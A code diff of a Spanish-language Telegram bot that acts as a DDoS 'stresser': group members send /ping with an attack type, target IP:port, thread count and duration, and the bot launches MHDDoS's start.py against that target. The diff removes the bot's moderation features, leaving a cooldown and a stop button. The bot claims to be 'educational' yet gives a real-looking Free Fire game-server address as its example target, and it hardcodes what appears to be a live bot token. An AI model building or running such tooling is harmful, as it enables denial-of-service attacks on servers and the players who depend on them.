@@ -1,65 +1,72 @@
 import telebot
 import subprocess
-import time
-import logging
 from threading import Lock
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPermissions
+import time
+import atexit
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# Configuración básica
-logging.basicConfig(level=logging.INFO)
 BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
 ADMIN_ID = 6348583777
-GROUP_ID = -1002260050481
+GROUP_ID = -1002260050481  # Reemplaza con el ID real de tu grupo
+GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
-# Inicialización del bot
 bot = telebot.TeleBot(BOT_TOKEN)
+db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
-blocked_words = set(["palabra1", "palabra2"])
-muted_users = {}
-db_lock = Lock()
 
-# ================= FUNCIONES AUXILIARES =================
+@atexit.register
+def close_db_connection():
+    pass  # No hay conexión de base de datos que cerrar
+
 def is_allowed(message):
-    """Verifica si el usuario tiene acceso al bot"""
-    return message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID)
+    """ Verifica si el mensaje proviene del grupo permitido o si es del admin en privado. """
+    if message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
+        return True
+    bot.reply_to(message, "❌ Este bot solo funciona en un grupo en específico.\n🔗 Únete a este grupo para poder utilizar este bot: " + GROUP_LINK)
+    return False
 
-def is_admin(chat_id, user_id):
-    """Verifica si un usuario es administrador"""
-    try:
-        chat_member = bot.get_chat_member(chat_id, user_id)
-        return chat_member.status in ["administrator", "creator"]
-    except Exception as e:
-        logging.error(f"Error verificando admin: {e}")
-        return False
-
-def check_muted_users():
-    """Elimina usuarios cuyo mute haya expirado"""
-    current_time = time.time()
-    expired = [user_id for user_id, end_time in muted_users.items() if end_time < current_time]
-    for user_id in expired:
-        del muted_users[user_id]
-
-# ================= HANDLERS PRINCIPALES =================
-@bot.message_handler(commands=["start", "menu", "admin"])
-def handle_menu(message):
+@bot.message_handler(commands=["start"])
+def handle_start(message):
     if not is_allowed(message):
         return
 
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        InlineKeyboardButton("🚫 Bloquear palabra", callback_data="block_word"),
-        InlineKeyboardButton("🔓 Aprobar enlaces", callback_data="approve_link"),
-        InlineKeyboardButton("👥 Listar admins", callback_data="list_admins"),
-        InlineKeyboardButton("⚡ Iniciar Ping", callback_data="start_ping"),
-        InlineKeyboardButton("🧹 Limpiar mensajes", callback_data="clean_chat")
+    markup = InlineKeyboardMarkup()
+    button = InlineKeyboardButton(
+        text="💻 SOPORTE - OFICIAL 💻",
+        url=f"tg://user?id={ADMIN_ID}"
     )
+    markup.add(button)
+
     bot.send_message(
         message.chat.id,
-        "🤖 *Menú de Administración* 🤖\n\nSelecciona una opción:",
+        (
+            "🎉 ¡Bienvenido al Bot de Ping MHDDoS para Free Fire! 🎮\n\n"
+            "⚡ *Conéctate al grupo para acceder a funciones exclusivas de este bot.*\n"
+            "💬 Si tienes preguntas, no dudes en contactarnos por soporte técnico.\n\n"
+            "🔧 *Comando principal:* `/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+            "⚠️ *Este bot fue diseñado para fines educativos y de prueba.*"
+        ),
         reply_markup=markup,
-        parse_mode="Markdown"
+        parse_mode="Markdown",
+    )
+
+@bot.message_handler(commands=["help"])
+def handle_help(message):
+    if not is_allowed(message):
+        return
+
+    bot.reply_to(
+        message,
+        (
+            "📘 *Comandos disponibles:*\n\n"
+            "🔹 `/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`: Inicia un ataque.\n"
+            "🔹 `/stop`: Detiene cualquier ataque en curso.\n\n"
+            "💡 *Ejemplo de uso:* `/ping UDP 143.92.125.230:10013 3 120`\n\n"
+            "🛠 Si necesitas ayuda adicional, contáctanos a través de nuestro soporte técnico."
+        ),
+        parse_mode="Markdown",
     )
 
 @bot.message_handler(commands=["ping"])
@@ -67,165 +74,85 @@ def handle_ping(message):
     if not is_allowed(message):
         return
 
-    try:
-        # Verificar cooldown
-        user_id = message.from_user.id
-        if user_id in cooldowns and time.time() - cooldowns[user_id] < 20:
-            bot.reply_to(message, "⏳ Espere 20 segundos antes de otro ataque")
-            return
+    telegram_id = message.from_user.id
 
-        # Validar formato del comando
-        args = message.text.split()
-        if len(args) != 5 or ":" not in args[2]:
-            raise ValueError("Formato inválido")
+    # Verificar cooldown
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
+        bot.reply_to(message, "❌ Espere 20 segundos antes de usar este comando nuevamente.")
+        return
 
-        attack_type, ip_port, threads, duration = args[1], args[2], args[3], args[4]
-        
-        # Ejecutar ataque
-        with db_lock:
-            process = subprocess.Popen(
-                ["python", START_PY_PATH, attack_type, ip_port, threads, duration],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            active_attacks[user_id] = process
-            cooldowns[user_id] = time.time()
-
-        # Respuesta con botón de parar
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{user_id}"))
-        
+    args = message.text.split()
+    if len(args) != 5 or ":" not in args[2]:
         bot.reply_to(
             message,
-            f"🔥 *Ataque Iniciado* 🔥\n\n"
-            f"📍 IP: `{ip_port}`\n"
-            f"⚙️ Tipo: {attack_type}\n"
-            f"🧵 Threads: {threads}\n"
-            f"⏳ Duración: {duration}ms",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            (
+                "❌ *Formato inválido!*\n\n"
+                "📌 *Uso correcto:*\n"
+                "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+                "💡 *Ejemplo:*\n"
+                "`/ping UDP 143.92.125.230:10013 3 120`"
+            ),
+            parse_mode="Markdown",
         )
-
-    except Exception as e:
-        logging.error(f"Error en ping: {e}")
-        bot.reply_to(message, f"❌ Error: {str(e)}")
-
-@bot.message_handler(commands=["mute"])
-def handle_mute(message):
-    if not is_admin(message.chat.id, message.from_user.id):
-        bot.reply_to(message, "❌ Comando solo para admins")
         return
+
+    attack_type = args[1]
+    ip_port = args[2]
+    threads = args[3]
+    duration = args[4]
+    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
 
     try:
-        args = message.text.split()
-        if not message.reply_to_message or len(args) < 2:
-            raise ValueError("Responde a un usuario y especifica tiempo en minutos")
-        
-        user_id = message.reply_to_message.from_user.id
-        mute_minutes = int(args[1])
-        end_time = time.time() + (mute_minutes * 60)
-        
-        muted_users[user_id] = end_time
-        bot.restrict_chat_member(
-            message.chat.id,
-            user_id,
-            ChatPermissions(can_send_messages=False),
-            until_date=end_time
-        )
-        bot.reply_to(message, f"🔇 Usuario muteado por {mute_minutes} minutos")
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        active_attacks[telegram_id] = process
+        cooldowns[telegram_id] = time.time()
 
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
-
-@bot.message_handler(commands=["unmute"])
-def handle_unmute(message):
-    if not is_admin(message.chat.id, message.from_user.id):
-        return
-
-    if message.reply_to_message:
-        user_id = message.reply_to_message.from_user.id
-        if user_id in muted_users:
-            del muted_users[user_id]
-            bot.restrict_chat_member(
-                message.chat.id,
-                user_id,
-                ChatPermissions(can_send_messages=True)
-            )
-            bot.reply_to(message, "🔊 Usuario desmuteado")
-
-# ================= SISTEMA DE ENLACES Y PALABRAS =================
-@bot.message_handler(func=lambda message: True)
-def handle_messages(message):
-    if not is_allowed(message):
-        return
-
-    check_muted_users()  # Limpiar mutes expirados
-    
-    # Si el usuario está muteado
-    if message.from_user.id in muted_users:
-        bot.delete_message(message.chat.id, message.message_id)
-        return
-
-    text = message.text.lower()
-    
-    # Detectar palabras bloqueadas
-    if any(word in text for word in blocked_words):
-        bot.delete_message(message.chat.id, message.message_id)
-        bot.reply_to(message, "❌ Mensaje contiene palabra prohibida")
-        return
-
-    # Detectar enlaces
-    if "http" in text:
-        link_id = str(message.message_id)
-        bot.delete_message(message.chat.id, message.message_id)
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("👁️ Mostrar Enlace", callback_data=f"show_{link_id}"))
-        bot.send_message(
-            message.chat.id,
-            "🔒 Enlace oculto - Solo visible para admins",
-            reply_markup=markup
+        markup.add(InlineKeyboardButton("✅ Confirmar Detener Ataque", callback_data=f"stop_{telegram_id}"))
+
+        bot.reply_to(
+            message,
+            (
+                "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
+                f"📍 *IP/Host:Porta:* {ip_port}\n"
+                f"⚙️ *Tipo:* {attack_type}\n"
+                f"🧵 *Threads:* {threads}\n"
+                f"⏳ *Tiempo (ms):* {duration}\n"
+                f"💻 *Comando ejecutado:* `ping`\n\n"
+                "⚠️ *Este bot fue creado por* @xFernandoh"
+            ),
+            reply_markup=markup,
+            parse_mode="Markdown",
         )
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
 
-# ================= COMANDOS ADICIONALES =================
-@bot.message_handler(commands=["help"])
-def handle_help(message):
-    logging.info("Comando /help recibido")
-    help_text = (
-        "🛠️ *Comandos Disponibles:*\n\n"
-        "⚙️ Administración:\n"
-        "/menu - Panel de control\n"
-        "/mute <minutos> - Silenciar usuario\n"
-        "/unmute - Desilenciar\n"
-        "/clean <cantidad> - Limpiar mensajes\n\n"
-        "🔧 Herramientas:\n"
-        "/ping - Iniciar ataque\n"
-        "/id - Ver tu ID\n"
-        "/help - Esta ayuda"
-    )
-    bot.reply_to(message, help_text, parse_mode="Markdown")
+@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
+def handle_stop_attack(call):
+    telegram_id = int(call.data.split("_")[1])
 
-@bot.message_handler(commands=["clean"])
-def handle_clean(message):
-    if not is_admin(message.chat.id, message.from_user.id):
+    if call.from_user.id != telegram_id:
+        bot.answer_callback_query(
+            call.id, "❌ Solo el usuario que inició el ataque puede pararlo."
+        )
         return
 
-    try:
-        args = message.text.split()
-        limit = int(args[1]) if len(args) > 1 else 10
-        for msg_id in range(message.message_id, message.message_id - limit, -1):
-            try:
-                bot.delete_message(message.chat.id, msg_id)
-            except:
-                pass
-        bot.reply_to(message, f"🧹 {limit} mensajes limpiados")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+    if telegram_id in active_attacks:
+        process = active_attacks[telegram_id]
+        process.terminate()
+        del active_attacks[telegram_id]
 
-@bot.message_handler(commands=["id"])
-def handle_id(message):
-    bot.reply_to(message, f"🆔 Tu ID: `{message.from_user.id}`", parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "✅ Ataque detenido con éxito.")
+        bot.edit_message_text(
+            "*[⛔] ATAQUE DETENIDO [⛔]*",
+            chat_id=call.message.chat.id,
+            message_id=call.message.id,
+            parse_mode="Markdown",
+        )
+        time.sleep(3)
+        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
+    else:
+        bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")
 
-# ================= EJECUCIÓN =================
 if __name__ == "__main__":
-    logging.info("Bot iniciado")
     bot.infinity_polling()
